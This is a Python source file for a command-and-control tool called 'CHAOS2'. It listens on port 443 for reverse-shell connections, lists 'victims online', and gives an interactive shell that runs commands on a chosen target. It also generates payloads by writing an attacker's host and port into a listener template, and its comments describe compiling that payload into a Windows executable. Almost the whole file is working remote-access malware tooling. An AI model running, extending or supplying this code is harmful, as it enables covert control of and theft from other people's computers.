import socket
import threading
import json
import sys
import os
import signal
import colorama
from colorama import Fore, Style


conn_list={}





def server():
    global conn_list
    global PORT
    HOST = ''
    PORT = 443
    global count
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((HOST, PORT))
    s.listen(1)

    while True:
        conn, addr = s.accept()
        mac=""
        if conn:
            mac=conn.recv(4098).decode('utf-8')
            if mac:
                if mac in conn_list:
                    print(Fore.GREEN,"\n[*] Target Online:{}".format(mac),Style.RESET_ALL)
                else:
                    print(Fore.BLUE,"\n[+] New Target Added:{}".format(mac),Style.RESET_ALL)
                    conn_list[mac]=conn

def client():
    global conn_list
    count = 0
    if conn_list:
        for key in conn_list:
            count+=1
            print("{}) {}".format(count,key))
    else:
        print(Fore.RED,"\n[*] List is empty",Style.RESET_ALL)



def trigger():
    try:
        global conn_list
        interaction=int(input("[*] Interact with:-"))
        if interaction:
            if conn_list:
                if interaction<=len(conn_list):
                    #print(conn_list)
                    console(conn_list[list(conn_list.keys())[interaction-1]],list(conn_list.keys())[interaction-1],list(conn_list.keys())[interaction-1])
        else:
            print(Fore.RED,"\n[*] No connections",Style.RESET_ALL)
    except socket.error:
        print(Fore.RED,"\n[*] Lost connection!",Style.RESET_ALL)

def console(conn,bot,socket_target):
    print(Fore.GREEN,"\n====Target::({})====".format(bot), Style.RESET_ALL)

    while True:
        try:
            commands=input("SHELL> ")
            a={bot:commands}
            if commands=='exit':
                return 0
            else:
                commands = bytes(commands, 'utf-8')
                conn.sendall(commands) # Otherwise we will send the command to the target
                out=conn.recv(64000).decode('cp1252')
                print(out)

        except socket.error:
            print(Fore.RED,"====Host:{} went offline===".format(bot), Style.RESET_ALL)
            del conn_list[socket_target]
            return 0


def generatePayload():
    print(Fore.YELLOW,"[*] Let's generate payloads",Style.RESET_ALL)

    # Python payload already exists? delete that fucker
    if os.path.exists("generated/payload.py"):
        os.remove("generated/payload.py")
    else:
        pass
    # Read from listener.py , and replace both port and host to those introduced by user, then append to payload.py
    print(Fore.YELLOW,"[!] Defaults to 127.0.0.1 - 443",Style.RESET_ALL)
    lhost=input("LHOST> ") or "127.0.0.1"
    lport=input("LPORT> ") or "443"
    # Read payload file, and replace host variable
    f = open("utils/listener.py", "r")
    x = open("generated/payload.py", "w+")
    for line in f:
        if ( "HOST = 127.0.0.1" in line ):
            x.write("    HOST = '" + lhost + "'\n")
        if ( "443" in line):
            x.write("    PORT = " + lport + "\n")
        else:
            if ( "HOST = 127.0.0.1" in line ):
                pass
            else:
                x.write(line)
    f.close()
    print(Fore.YELLOW,"[*] Creating .exe payload for win targets . . .", Style.RESET_ALL)
    # We need to compile using wine bruuuuhhhhh, :()
    # $ sudo apt-get install wine
    # $ wget https://www.python.org/ftp/python/2.7.9/python-2.7.9.amd64.msi
    # $ wine msiexec /i python-2.7.9.amd64.msi /qb
    # $ sudo dpkg --add-architecture i386 && sudo apt-get update && sudo apt-get install wine32
    # $ cd ~/.wine/drive_c/Python27
    # $ wine python.exe Scripts/pip.exe install pyinstaller
    # $ wine ~/.wine/drive_c/Python27/Scripts/pyinstaller.exe --onefile helloworld.py
    
    
    print(Fore.YELLOW,"[*] .exe created! Check dist folder!  . . .",Style.RESET_ALL)



def bye():
    print(Fore.YELLOW," \n[!] ooof bye :(",Style.RESET_ALL)


def banner():
    print("")
    print(" ██████╗██╗  ██╗ █████╗  ██████╗ ███████╗██████╗ ")
    print("██╔════╝██║  ██║██╔══██╗██╔═══██╗██╔════╝╚════██╗")
    print("██║     ███████║███████║██║   ██║███████╗ █████╔╝")
    print("██║     ██╔══██║██╔══██║██║   ██║╚════██║██╔═══╝ ")
    print("╚██████╗██║  ██║██║  ██║╚██████╔╝███████║███████╗")
    print(" ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚══════╝")

def main():
    banner()
    threading.Thread(target=server).start()
    print(Fore.YELLOW,"\n[*] Server Started - Listening on port: " + str(PORT), Style.RESET_ALL)
    print(Fore.YELLOW,"\n[*] Type help or ? for options", Style.RESET_ALL)
    while True:
        print(bcolors.ENDC)
        choice=input("CHAOS2> ")
        choice.replace(" ", "")
        if choice=='hosts' or choice =='h':
            p=threading.Thread(target=client)
            p.start()
            p.join()
        elif choice =='interact' or choice =='i':
            p=threading.Thread(target=trigger)
            p.start()
            p.join()
        elif choice =='help' or choice =='?':
            #print(bcolors.HEADER,"\nCommands==========\n[+] hosts or h \t\tCheck for available victims online\n[+] interact or i (To interact with a target)\n==========")
            print(bcolors.HEADER,"\nCommands\n==========\n[+] hosts or h \t\t\t\tCheck for available victims online")
            print("[+] interact or i \t\t\tinteract with a target")
            print("[+] payload or p \t\t\tgenerate payloads")
            print("==========")
            print(bcolors.ENDC)
        elif choice =='payload' or choice =='p':
            generatePayload()
        else:
            pass


# Alternative colors
# print(bcolors.HEADER,"\
class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

try:
    main()
except:
    bye()

